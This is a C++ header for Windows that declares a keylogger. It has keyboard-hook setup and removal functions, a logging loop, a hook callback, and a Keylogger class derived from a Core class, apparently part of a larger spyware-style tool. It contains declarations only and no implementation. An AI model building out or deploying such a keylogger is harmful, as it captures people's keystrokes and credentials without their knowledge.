#pragma once
#define WIN32_LEAN_AND_MEAN
#include "core.h"
#include <Windows.h>
#include <string>
using namespace std;

void SetKeyBoardHook();
void RemoveKeyBoardHook();
void keylog_loop();
LRESULT CALLBACK KeyBoardHookCallBack(int code, WPARAM wParam, LPARAM lParam);

class Keylogger : public virtual Core
{
public:
	Keylogger();
	~Keylogger();
};